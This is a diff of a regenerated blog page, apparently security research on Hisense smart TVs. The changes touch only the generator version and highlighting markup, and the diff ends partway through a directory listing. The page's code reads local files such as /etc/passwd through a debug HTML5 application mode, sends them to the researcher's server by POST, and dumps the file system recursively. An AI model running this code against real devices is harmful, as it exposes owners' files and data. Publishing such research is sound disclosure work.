@@ -93,7 +93,7 @@
 <script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script>
 
 
-<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.85.0" />
+<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.96.0" />
     
 
     
@@ -313,129 +313,129 @@
 <h1 id="custom-javascript-api">Custom JavaScript API</h1>
 <p>I&rsquo;ve decided to research whether hidden debugging features are activated. It turns out that the integrated web browser of the TV implements a special <code>hisense://debug</code> URL handler. It allows adding additional HTML5 applications by specifying an application&rsquo;s URL. At first, this seems to be just a shortcut on the menu that points to an arbitrary URL. But, as I discovered, web sites launched in <em>HTML5 application mode</em> seem to have access to additional functionality of the browser.</p>
 <p>Using the <code>file:///</code> handler is one feature of this kind. A common trick when exploiting HTML-to-PDF converters is to use this handler in combination with an <code>XMLHttpRequest</code> to read local files. The same attack can be performed on Hisense TVs using the following code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
-
-&lt;<span style="color:#f92672">head</span>&gt;
-    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refresh&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1; URL=/&#34;</span>&gt;
-&lt;/<span style="color:#f92672">head</span>&gt;
-
-&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;readTextFile(&#39;file:///etc/passwd&#39;)&#34;</span>&gt;
-    &lt;<span style="color:#f92672">script</span>&gt;
-        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">readTextFile</span>(<span style="color:#a6e22e">filename</span>) {
-            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rawFile</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
-            <span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">filename</span>, <span style="color:#66d9ef">false</span>);
-            <span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
-                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">4</span>) {
-                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
-                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">daText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">responseText</span>;
-
-                        <span style="color:#75715e">// POST data to me :)
-</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">formData</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FormData</span>();
-                        <span style="color:#a6e22e">formData</span>.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;name&#34;</span>, <span style="color:#a6e22e">filename</span>)
-                        <span style="color:#a6e22e">formData</span>.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;file&#34;</span>, <span style="color:#a6e22e">daText</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n\r\n\r\n&#34;</span>);
-                        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/upload/file&#39;</span>, { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">formData</span> });
-                        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;YOLO!&#34;</span>);
-                    }
-                }
-            }
-            <span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">send</span>(<span style="color:#66d9ef">null</span>);
-        }
-    &lt;/<span style="color:#f92672">script</span>&gt;
-&lt;/<span style="color:#f92672">body</span>&gt;
-&lt;/<span style="color:#f92672">html</span>&gt;
-</code></pre></div><p>This reads the <code>/etc/passwd</code> file from the TV&rsquo;s file system and transfers it back to my machine using a POST request. As can be seen above, I&rsquo;ve added a <code>refresh</code> directive to the site that allows me to dump multiple things programmatically. The HTML5 applications refreshes the site after sending a file and can therefore be instrumented to read and send another file afterwards. An interesting fact is that this did <em>not</em> work from the regular context that&rsquo;s available by simply opening a browser and visiting a web site.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refresh&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1; URL=/&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;readTextFile(&#39;file:///etc/passwd&#39;)&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">readTextFile</span>(<span style="color:#a6e22e">filename</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rawFile</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">filename</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">4</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">daText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">responseText</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// POST data to me :)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">formData</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FormData</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">formData</span>.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;name&#34;</span>, <span style="color:#a6e22e">filename</span>)
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">formData</span>.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;file&#34;</span>, <span style="color:#a6e22e">daText</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n\r\n\r\n&#34;</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/upload/file&#39;</span>, { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">formData</span> });
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;YOLO!&#34;</span>);
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rawFile</span>.<span style="color:#a6e22e">send</span>(<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>This reads the <code>/etc/passwd</code> file from the TV&rsquo;s file system and transfers it back to my machine using a POST request. As can be seen above, I&rsquo;ve added a <code>refresh</code> directive to the site that allows me to dump multiple things programmatically. The HTML5 applications refreshes the site after sending a file and can therefore be instrumented to read and send another file afterwards. An interesting fact is that this did <em>not</em> work from the regular context that&rsquo;s available by simply opening a browser and visiting a web site.</p>
 <p>A convenient thing is that both files and directory contents can be dumped this way. For example, specifying <code>file:///</code> allows dumping the directory listing of the <code>/</code> directory in HTML format:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;appcache&#34;</span>,<span style="color:#e6db74">&#34;appcache&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;applications&#34;</span>,<span style="color:#e6db74">&#34;applications&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;bin&#34;</span>,<span style="color:#e6db74">&#34;bin&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;808 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;cacert&#34;</span>,<span style="color:#e6db74">&#34;cacert&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;certificate&#34;</span>,<span style="color:#e6db74">&#34;certificate&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;1.0 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;config&#34;</span>,<span style="color:#e6db74">&#34;config&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;Customer&#34;</span>,<span style="color:#e6db74">&#34;Customer&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;CustomerBackup&#34;</span>,<span style="color:#e6db74">&#34;CustomerBackup&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;data&#34;</span>,<span style="color:#e6db74">&#34;data&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;database&#34;</span>,<span style="color:#e6db74">&#34;database&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;dev&#34;</span>,<span style="color:#e6db74">&#34;dev&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3.7 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;etc&#34;</span>,<span style="color:#e6db74">&#34;etc&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;502 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;font&#34;</span>,<span style="color:#e6db74">&#34;font&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;37 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;hidata&#34;</span>,<span style="color:#e6db74">&#34;hidata&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;59 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;home&#34;</span>,<span style="color:#e6db74">&#34;home&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;lib&#34;</span>,<span style="color:#e6db74">&#34;lib&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;1.2 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;lost+found&#34;</span>,<span style="color:#e6db74">&#34;lost+found&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;mnt&#34;</span>,<span style="color:#e6db74">&#34;mnt&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;2.9 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;mslib&#34;</span>,<span style="color:#e6db74">&#34;mslib&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;8.0 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;OAD&#34;</span>,<span style="color:#e6db74">&#34;OAD&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;opt&#34;</span>,<span style="color:#e6db74">&#34;opt&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;proc&#34;</span>,<span style="color:#e6db74">&#34;proc&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;0 B&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;root&#34;</span>,<span style="color:#e6db74">&#34;root&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;sbin&#34;</span>,<span style="color:#e6db74">&#34;sbin&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;604 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;serialdata&#34;</span>,<span style="color:#e6db74">&#34;serialdata&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;subsystem&#34;</span>,<span style="color:#e6db74">&#34;subsystem&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;sys&#34;</span>,<span style="color:#e6db74">&#34;sys&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;0 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;system&#34;</span>,<span style="color:#e6db74">&#34;system&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tmp&#34;</span>,<span style="color:#e6db74">&#34;tmp&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;760 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tvcommon&#34;</span>,<span style="color:#e6db74">&#34;tvcommon&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;1.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tvconfig&#34;</span>,<span style="color:#e6db74">&#34;tvconfig&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tvcustomer&#34;</span>,<span style="color:#e6db74">&#34;tvcustomer&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tvdatabase&#34;</span>,<span style="color:#e6db74">&#34;tvdatabase&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tvservice&#34;</span>,<span style="color:#e6db74">&#34;tvservice&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;usb&#34;</span>,<span style="color:#e6db74">&#34;usb&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;usr&#34;</span>,<span style="color:#e6db74">&#34;usr&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;64 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;var&#34;</span>,<span style="color:#e6db74">&#34;var&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;440 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;vddt&#34;</span>,<span style="color:#e6db74">&#34;vddt&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;vendor&#34;</span>,<span style="color:#e6db74">&#34;vendor&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;26 B&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;init&#34;</span>,<span style="color:#e6db74">&#34;init&#34;</span>,<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">&#34;559 kB&#34;</span>, [...])
-<span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;linuxrc&#34;</span>,<span style="color:#e6db74">&#34;linuxrc&#34;</span>,<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">&#34;559 kB&#34;</span>, [...])
-</code></pre></div><p>The browser seems to be able to read the contents of the <code>/root</code> directory as well :) I&rsquo;ve then developed a function that dumps the directory listings of each directory recursively to get a better understanding of the file system structure:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">dumpFS</span>(<span style="color:#a6e22e">path</span>) {
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">readFS</span>(<span style="color:#a6e22e">path</span>);
-    <span style="color:#a6e22e">postContent</span>(<span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">content</span>);
-
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">lines</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">idx</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">lines</span>) {
-        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">line</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lines</span>[<span style="color:#a6e22e">idx</span>];
-
-        <span style="color:#75715e">// not an entry
-</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">line</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;addRow&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
-            <span style="color:#66d9ef">continue</span>
-        }
-
-        <span style="color:#75715e">// check if dir flag is set (don&#39;t dump files in this step)
-</span><span style="color:#75715e"></span>        <span style="color:#75715e">// 1 --&gt; dir
-</span><span style="color:#75715e"></span>        <span style="color:#75715e">// 0 --&gt; file
-</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">line</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;,1,&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
-            <span style="color:#66d9ef">continue</span>
-        }
-
-        <span style="color:#75715e">// parse directory listing entry
-</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">entryName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">line</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;(&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>)[<span style="color:#ae81ff">0</span>];
-        <span style="color:#a6e22e">entryName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">entryName</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;script&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/^\s+|\s+$/g</span>, <span style="color:#e6db74">&#39;&#39;</span>);
-
-        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wholePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">entryName</span>;
-        <span style="color:#75715e">// don&#39;t ask why
-</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">wholePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;//&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>);
-        <span style="color:#a6e22e">wholePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;//&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>);
-
-        <span style="color:#75715e">// don&#39;t dump specific directories
-</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;/proc&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;/udev&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;/dev&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;/sys&#34;</span>)) {
-            <span style="color:#66d9ef">continue</span>;
-        }
-
-        <span style="color:#a6e22e">dumpFS</span>(<span style="color:#a6e22e">wholePath</span>);
-    }
-
-    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">path</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>) {
-        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;DONE&#34;</span>);
-    }
-}
-</code></pre></div><p>The HTTP server on my machine then receives the POST requests, parses the received content and stores the output. My server is based on <a href="https://gist.github.com/bradmontgomery/2219997">this gist</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;appcache&#34;</span>,<span style="color:#e6db74">&#34;appcache&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;applications&#34;</span>,<span style="color:#e6db74">&#34;applications&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;bin&#34;</span>,<span style="color:#e6db74">&#34;bin&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;808 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;cacert&#34;</span>,<span style="color:#e6db74">&#34;cacert&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;certificate&#34;</span>,<span style="color:#e6db74">&#34;certificate&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;1.0 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;config&#34;</span>,<span style="color:#e6db74">&#34;config&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;Customer&#34;</span>,<span style="color:#e6db74">&#34;Customer&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;CustomerBackup&#34;</span>,<span style="color:#e6db74">&#34;CustomerBackup&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;data&#34;</span>,<span style="color:#e6db74">&#34;data&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;database&#34;</span>,<span style="color:#e6db74">&#34;database&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
